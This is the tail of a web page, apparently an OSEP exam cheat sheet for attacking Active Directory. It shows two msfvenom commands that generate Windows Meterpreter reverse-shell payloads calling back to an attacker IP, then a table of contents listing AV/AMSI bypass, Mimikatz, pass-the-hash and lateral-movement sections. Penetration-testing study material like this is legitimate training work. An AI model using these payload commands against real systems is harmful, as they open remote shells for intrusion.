msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>192.168.49.57 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f raw <span class="nv">StagerVerifySSLCert</span><span class="o">=</span><span class="nb">true</span> <span class="nv">handlersslcert</span><span class="o">=</span>/mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator/msf_tmp/certificate_msfvenom.pem -o /mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator/msf_tmp/reverse_https.raw
Paylaod Generator: reverse_tcp:raw
msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.49.57 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f raw -o /mnt/hgfs/Shared_Folder/OSEP-CHEATGEN/kali-generator/msf_tmp/reverse_tcp.raw
</code></pre></div> 
          </div>
        

      </section>

      
        <aside class="toc"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#ad-cheatgen-my-own-command-reference-generator">AD-Cheatgen my own Command Reference generator.</a></li>
        <li><a href="#collect-proof-for-osep-exam">Collect proof for OSEP exam.</a></li>
        <li><a href="#color-the-text-in-terminal">Color the text in terminal.</a></li>
        <li><a href="#send-email-to-client-side-attack">send email to Client side attack</a></li>
        <li><a href="#execute-command-in-remote-computer">Execute command in remote computer.</a></li>
        <li><a href="#nmap">Nmap</a></li>
        <li><a href="#update-the-shell">Update the shell</a></li>
        <li><a href="#initial-shell">Initial Shell</a></li>
        <li><a href="#bypass-av--amsi--constrain-mode--applocker">Bypass AV / AMSI / CONSTRAIN MODE / APPLOCKER</a></li>
        <li><a href="#printspoofer-exploit">Printspoofer exploit</a></li>
        <li><a href="#weaponized-tools">Weaponized tools.</a></li>
        <li><a href="#lateral-moment">Lateral moment</a></li>
        <li><a href="#enable-rdp">Enable RDP</a></li>
        <li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
        <li><a href="#mimikatz">Mimikatz</a></li>
        <li><a href="#kekeo">kekeo</a></li>
        <li><a href="#pass-the-hash-and-or-restricted-admin-login">Pass-The-Hash and or Restricted Admin login</a></li>
        <li><a href="#blood-hound-queries">Blood-Hound Queries</a></li>
      </ul>
    </li>
    <li><a href="#attacking-ad-from-linux">Attacking AD from Linux</a>
      <ul>
        <li><a href="#turn-of-automatic-date-and-time">Turn of automatic date and time</a></li>
        <li><a href="#crackmap">Crackmap</a></li>
        <li><a href="#linux-powerview">Linux Powerview</a></li>
        <li><a href="#compare-groups-with-the-default-groups-and-find-the-difff">Compare Groups with the default groups and find the difff</a></li>
        <li><a href="#convert-ticket-to-kerbi-formate">Convert Ticket to kerbi formate.</a></li>
        <li><a href="#impacket">Impacket</a></li>
        <li><a href="#mssql-queries">MSSQL Queries</a></li>
        <li><a href="#powerup-sql">Powerup SQL</a></li>
        <li><a href="#cracking-hashes">Cracking hashes.</a></li>
        <li><a href="#metasploit-reverse-shell">Metasploit Reverse shell</a></li>
      </ul>
    </li>
  </ul>
</nav></aside>
      
    </div>

  </article>

  


  <hr>
<footer>
   

    <div class="copyright">
        <hr>
        Copyright ©  2022 Exploit-Me.com <br> 
        
       
        <div style="padding: 20px 0; font-size: 1.5em;">
      
        <a href="https://twitter.com/ksecurity45"><i class="twitter"><svg aria-hidden="true" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svgtwitter  "><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z" ></path></svg></i></a>
        <a href="https://github.com/ksecurity45"><i class="github"><svg aria-hidden="true" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="svggithub "><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z" ></path></svg></a></i></a>
      
        </div>
        
        
    </div>

   
</footer>



      


    </main>

    <carbon-ads></carbon-ads>

    <route-loader>
        <div class="spinner">
            <div class="double-bounce1"></div>
            <div class="double-bounce2"></div>
          </div>
    </route-loader>

    <algolia-search></algolia-search>

    <app-notification></app-notification>

    <login-modal></login-modal>
  </body>
</html>